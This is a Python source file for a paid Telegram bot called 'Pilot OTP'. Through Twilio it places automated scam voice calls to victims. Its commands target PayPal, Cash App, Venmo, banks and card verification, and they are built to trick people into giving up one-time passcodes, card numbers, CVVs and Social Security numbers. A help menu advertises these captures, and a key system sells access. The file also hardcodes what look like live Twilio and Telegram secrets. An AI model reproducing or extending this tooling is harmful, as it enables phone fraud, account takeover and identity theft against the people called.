import os
import telebot
import sqlite3
from twilio.rest import Client
from telebot import types
import json
import requests
while True:
  try:
    account_sid = 'AC4c3c793eac842346cef4820e46501295'
    callid = None
    auth_token = '27ac8193bae177474d54c0fc4421578c'
    from_number = '+15076691829'
    status_callback_url = 'https://fdaf-100-0-165-141.ngrok.io/call/status'
    telegram_bot_token = '6096442307:AAEoN0VodeJjvtmwOQzFKBqKQRMBG75wh-M'
    telegram_bot = telebot.TeleBot(telegram_bot_token)
    @telegram_bot.message_handler(commands=['cashapp'])
    def cashapp_command(message):
        try:
            print(message.from_user.id)
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 2:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /cashapp John +1234567189')
            return
        name, to_number = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/cashapp?name={name}&chanid={message.chat.id}'
        )
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        print(call.sid)
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['paypal'])
    def paypal_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 2:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /paypal John +1234567189')
            return
        name, to_number = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/paypal?name={name}&chanid={message.chat.id}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['vbv'])
    def vbv_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 2:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /vbv John +1234567189')
            return
        name, to_number = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/vbv?name={name}&chanid={message.chat.id}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['venmo'])
    def paypal_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 2:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call, e.g. /venmo John +1234567189')
            return
        name, to_number = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/venmo?name={name}&chanid={message.chat.id}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['otp'])
    def paypal_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 4:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call Target Company and code langth, e.g. /otp John +1234567189 Zelle 6')
            return
        name, to_number, company, digt = command_args
        if isinstance(digt, str) == False:
            telegram_bot.reply_to(message, 'Please specify the name and phone number to call Target Company and code langth, e.g. /otp John +1234567189 Zelle 6')
            return
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/otp?name={name}&chanid={message.chat.id}&bisname={company}&dgt={digt}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['bank'])
    def bank_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 3:
            telegram_bot.reply_to(message, 'Please specify the name, phone number, and bank name to call, e.g. /bank John +1234567890 Chase')
            return
        name, to_number, bank_name = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/bank?name={name}&chanid={message.chat.id}&bank={bank_name}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    #CVV
    @telegram_bot.message_handler(commands=['ssn'])
    def ssn_command(message):
        try:
            r = requests.get(f"http://localhost:7300/verify?username={message.from_user.id}")
            if r.text == "200":
                pass
            else:
                telegram_bot.reply_to(message, '❌Please Buy Pilot To Use These Commands')
                return
        except:
            print("SERVER 505 ERROR")
        command_args = message.text.split()[1:]
        if len(command_args) != 3:
            telegram_bot.reply_to(message, 'Please specify the name, phone number, and bank name to call, e.g. /ssn John +1234567890 Chase')
            return
        name, to_number, bank_name = command_args
        
        # Create the Twilio call
        client = Client(account_sid, auth_token)
        call = client.calls.create(
            machine_detection='Enable',
            to=to_number,
            status_callback=status_callback_url+f"?chanid={message.chat.id}",
            from_=from_number,
            status_callback_event=['Completed'],
            url=f'https://fdaf-100-0-165-141.ngrok.io/voice/ssn?name={name}&chanid={message.chat.id}&bank={bank_name}')
        button_text = "Hangup"
        button_data = f'hangup {call.sid}'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        keyboard = types.InlineKeyboardMarkup().add(button)
        message_text = "📞 Call Ringing"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard)
    @telegram_bot.message_handler(commands=['help'])
    def help_command(message):
        button_text = "Buy"
        button_data = 'buying'
        button = types.InlineKeyboardButton(text=button_text, callback_data=button_data)
        button_text2 = "Server"
        button_data2 = 'server'
        button2 = types.InlineKeyboardButton(text=button_text2, callback_data=button_data2)
        keyboard = types.InlineKeyboardMarkup().add(button).add(button2)
        message_text = "✈️ Pilot OTP\n\n🤖 Core Commands\n• 📖~ /help | view commands\n• 🎧~/setvoice | set language\n• ⏰~/plan | display your current plan\n\n📱Call Commands\n• 🔐~/otp | Capture OTP\n• 💳~/card | Capture Card Numbers\n• 💳~/cvv | Capture CVV\n• 💳~/vbv | Capture vbv\n• 📅~/date | Capture expiration date\n• 🪪~/ssn | Capture SSN\n• 🎉~/speak | Say any Text\n\n 🔗 Premade Commands\n• 🅿️~/paypal | Capture paypal\n• 💵~/cashapp | Capture Cashapp\n• 🏦~/bank | Capture 6 digit Bank Code\n• 📤~/venmo | Captures Venmo"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text, reply_markup=keyboard,parse_mode= 'Markdown')
    @telegram_bot.message_handler(commands=['plan'])
    def plan_command(message):
        loadtime = requests.get(f"http://localhost:7300/user_info?username={message.chat.id}")
        if "error" in loadtime.text:
            telegram_bot.send_message(chat_id=message.chat.id, text="⏰ Plan\n\n❌Looks like you don't have a plan right now!",parse_mode= 'Markdown')
            return
        y = json.loads(loadtime.text)
        exp=y["expiration_date"]
        message_text = f"⏰ Plan\n\n🗓️Your account expires at {exp}"
        telegram_bot.send_message(chat_id=message.chat.id, text=message_text,parse_mode= 'Markdown')
        return
    @telegram_bot.message_handler(commands=['myid'])
    def plan_command(message):
        telegram_bot.send_message(chat_id=message.chat.id, text=f"🔑ChatID: {message.chat.id}",parse_mode= 'Markdown')
        return
    @telegram_bot.message_handler(commands=['key'])
    def plan_command(message):
        command_args = message.text.split()[1:]
        if len(command_args) != 1:
            telegram_bot.reply_to(message, 'Please specify the Key, e.g. /key 123456abcdef')
            return
        key = command_args
        conn = sqlite3.connect('purchases.db')
        cursor = conn.cursor()
        cursor.execute('SELECT product_type FROM purchases WHERE one_time_code = ?', (key))
        row = cursor.fetchone()
        if row is not None:
            cursor.execute('DELETE FROM purchases WHERE one_time_code = ?', (key))
            conn.commit()
        if row is not None:
            product_type = row[0]
            telegram_bot.send_message(chat_id=message.chat.id, text=f"🔑Product Key: {key} For {product_type}",parse_mode= 'Markdown')
            requests.get(f"http://localhost:7300/add_user?username={message.chat.id}&role=user&subtype={product_type}") 
        else:
            telegram_bot.send_message(chat_id=message.chat.id, text=f"❌Not a Valid Product Key",parse_mode= 'Markdown')
        return
    @telegram_bot.callback_query_handler(func=lambda call: True)
    def handle_callback_query(call):
            call_data = call.data.split()
            if call_data[0] == 'hangup':
                client = Client(account_sid, auth_token)
                call_sid = call_data[1]
                client.calls(call_sid).update(status='completed')
    telegram_bot.polling()
  except Exception as e: print(e)
  #http://localhost:7300/user_info?username={message.chat.id}